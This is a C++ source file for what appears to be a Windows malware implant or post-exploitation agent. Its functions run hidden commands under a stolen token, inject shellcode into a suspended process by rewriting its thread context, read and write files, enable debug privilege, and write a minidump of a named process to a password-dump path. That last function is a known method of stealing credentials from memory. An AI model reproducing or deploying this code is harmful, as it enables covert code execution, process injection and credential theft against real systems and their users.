#include "pch.h"
#include "Functions.h"
#include "HttpFactory.h"
#include <strsafe.h>
#include <sstream>
#include <wincrypt.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#pragma comment (lib, "dbghelp.lib")

BOOL RunCommand(OUT LPVOID lpData, IN LPSTR Command, IN HANDLE phToken) { // need to be check

	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	SECURITY_ATTRIBUTES sa;
	HANDLE hStdOUT_RD = NULL;
	HANDLE hStdOUT_WR = NULL;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;
	CreatePipe(&hStdOUT_RD, &hStdOUT_WR, &sa, 0);
	
	ZeroMemory(&si, sizeof(STARTUPINFOW));
	si.cb = sizeof(STARTUPINFOW);
	si.hStdError = hStdOUT_WR;
	si.hStdOutput = hStdOUT_WR;
	si.dwFlags = 257;
	si.wShowWindow = 0;
	si.lpDesktop = (LPWSTR)L"winsta0\\default";
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	DWORD dwCommandSize = MAX_PATH;

	int len = MultiByteToWideChar(CP_ACP, 0, Command, -1, NULL, 0);
	LPWSTR wChar = NULL;
	if (len) {
		wChar = (LPWSTR)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		MultiByteToWideChar(CP_ACP, 0, Command, -1, wChar, len);
	}
	if (phToken && CreateProcessWithTokenW(phToken, 2u, 0, wChar, 0x10u, 0, 0, &si, &pi)) {
		goto LABEL3;
	}
	if(CreateProcessW(0, wChar, NULL, NULL, 1, 0x10, NULL, NULL, &si, &pi)){
LABEL3:
		WaitForSingleObject(pi.hProcess, 30);
		CloseHandle(hStdOUT_WR);
		DWORD dwRead = 0;
		DWORD dwAll = 0;
		char chRBuf[BUFSIZE];
		LPVOID lpTmpBuffer = lpData;
		while (TRUE) {
			if (!ReadFile(hStdOUT_RD, chRBuf, BUFSIZE, &dwRead, NULL))
				break;
			if (dwRead == 0) break;
			lpTmpBuffer = static_cast<char*>(lpData) + dwAll;
			dwAll += dwRead;
			if (dwAll >= MAX_DATA) break;
			CopyMemory(lpTmpBuffer, chRBuf, dwRead);
			ZeroMemory(&chRBuf, BUFSIZE);
		}
	}
	if (wChar) {
		VirtualFree(wChar, 0, MEM_RELEASE);
	}
	CloseHandle(hStdOUT_RD);
	return TRUE;
}

VOID InjectShellcode(OUT LPVOID lpOutputData, IN LPSTR lpProc, IN LPSTR data) { 
	// Hollowing Process
	DWORD dwB64Size = MAX_DATA;
	STARTUPINFOA si = {sizeof(si)};
	PROCESS_INFORMATION pi;
	SIZE_T dwWritten = 0;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if (!CreateProcessA((LPSTR)lpProc, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)){
		CopyMemory(lpOutputData, "Fail to start process\0", 22);
	LABEL4:
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}
	
	LPVOID lpShellcode = VirtualAllocEx(pi.hProcess, NULL, strlen(data)+1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if(!WriteProcessMemory(pi.hProcess, lpShellcode, (BYTE*)data, strlen(data) + 1, &dwWritten)) {
		CopyMemory(lpOutputData, "Fail to inject shellcode\0", 25);
		goto LABEL4;
	}

	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;

	GetThreadContext(pi.hThread, &ctx);
	ctx.Rip = (DWORD64)lpShellcode;
	ctx.Rdi = (DWORD64)0;
	ctx.Rsi = (DWORD64)0;
	ctx.Rcx = (DWORD64)0;
	ctx.R8 = (DWORD64)0;
	ctx.R9 = (DWORD64)0;

	SetThreadContext(pi.hThread, &ctx);
	Sleep(30);

	ResumeThread(pi.hThread);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	CopyMemory(lpOutputData, "DONE", 4);
}

BOOL WriteBody(IN LPVOID lpInputData, IN LPSTR filePath){
	SYSTEMTIME st;
	GetSystemTime(&st);
	HANDLE hFile = NULL;
	LPVOID lpData = VirtualAlloc(NULL, strlen((LPSTR)lpInputData)+14, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!lpData) {
		return FALSE;
	}
	ZeroMemory(lpData, strlen((LPSTR)lpInputData) + 14);
	StringCbPrintfA((LPSTR)lpData, strlen((LPSTR)lpInputData) + 14, "%02d/%02d/%04d| %s\r\n", st.wDay, st.wMonth, st.wYear, (LPSTR)lpInputData);
	hFile = CreateFileA((LPSTR)filePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwPtr = SetFilePointer(hFile, 0, NULL, FILE_END);
	DWORD dwWritten = 0;
	WriteFile(hFile, lpData, strlen((LPCSTR)lpData), &dwWritten, NULL);
	CloseHandle(hFile);
	VirtualFree(lpData, strlen((LPSTR)lpInputData) + 11, MEM_RELEASE);
	return TRUE;
}
BOOL FileWrite(IN LPVOID filePath, IN LPVOID data, OUT LPVOID outputData) {
	// check dir -> create file -> write file
	HANDLE hFile = NULL;
	BY_HANDLE_FILE_INFORMATION fileInfo;
	
	hFile = CreateFileA((LPSTR)filePath, GENERIC_READ | GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		CloseHandle(hFile);
		return FALSE;
	}
	DWORD dwWritten = 0;
	if (!WriteFile(hFile, (LPSTR)data, strlen((LPCSTR)data), &dwWritten, NULL)) {
		CloseHandle(hFile);
		return FALSE;
	}
	if (!GetFileInformationByHandle(hFile, &fileInfo)) {
		CloseHandle(hFile);
		return FALSE;
	}
	StringCbPrintfA((LPSTR)outputData, MAX_DATA, "%s file size %d\0", "DONE", fileInfo.nFileSizeLow);
	CloseHandle(hFile);
	return TRUE;
	
}
DWORD FileRead(IN LPSTR lpInData, OUT LPVOID& lpOutData){// run ok
	HANDLE hFile = NULL;
	DWORD dwRead = 0;
	LARGE_INTEGER fileSize;;
	hFile = CreateFileA(lpInData, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return 0;
	}
	GetFileSizeEx(hFile, &fileSize);
	if (fileSize.QuadPart >= MAX_DATA) {
		lpOutData = VirtualAlloc(NULL, (SIZE_T)fileSize.QuadPart + 1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	}
	if (!ReadFile(hFile, lpOutData, fileSize.QuadPart, &dwRead, NULL)) {
		CloseHandle(hFile);
		return 0;
	}
	((char*)lpOutData)[fileSize.QuadPart] = '\0';
	CloseHandle(hFile);
	return dwRead;
}
int findProc(char* procname) {

	HANDLE hSnapshot;
	PROCESSENTRY32 pe;
	int pid = 0;
	BOOL hResult;
	char convertName[30];
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
	pe.dwSize = sizeof(PROCESSENTRY32);
	hResult = Process32First(hSnapshot, &pe);
	while (hResult) {
		WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1, convertName, 30, NULL, NULL);
		if (strcmp(procname, convertName) == 0) {
			pid = pe.th32ProcessID;
			break;
		}
		hResult = Process32Next(hSnapshot, &pe);
	}
	CloseHandle(hSnapshot);
	return pid;
}

// set privilege
BOOL setPrivilege(LPCTSTR priv) {
	HANDLE token;
	TOKEN_PRIVILEGES tp;
	LUID luid;
	BOOL res = TRUE;
	if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token)) res = FALSE;
	if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;
	return res;
}
// minidump 
BOOL createMiniDump(char* procName) {
	char filePath[50];
	snprintf(filePath, 50, "%s%s.dmp", PASS_FILE, procName);
	bool dumped = FALSE;
	int pid = findProc(procName);
	if (!setPrivilege(SE_DEBUG_NAME))
		return dumped;
	if (pid == 0)
		return dumped;
	HANDLE ph = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, pid);
	HANDLE out = CreateFileA((LPCSTR)filePath, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (ph && out != INVALID_HANDLE_VALUE) {
		dumped = MiniDumpWriteDump(ph, pid, out, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);
	}
	CloseHandle(ph);
	CloseHandle(out);
	return dumped;	
	// if file exist?
}

VOID MemDump(OUT LPVOID outData, IN LPSTR lpInputData) { // run ok
	/*if (!setPrivilege(SE_DEBUG_NAME))
		StringCchCatA((LPSTR)outData, sizeof(outData), "Cannot set debug priv\n");
	else 
		StringCchCatA((char *)outData, sizeof(outData), "Set debug priv done\n");*/
	if (!createMiniDump((char *)lpInputData))
		//StringCchCatA((char*)outData, strlen("Failed to dump\0"), "Failed to dump\0");
		CopyMemory(outData, "Failed to dump", 15);
	else
		/*StringCchCatA((char *)outData, strlen("Success dumped\0"), "Success dumped\0");*/
		CopyMemory(outData, "Dump success", 12);
}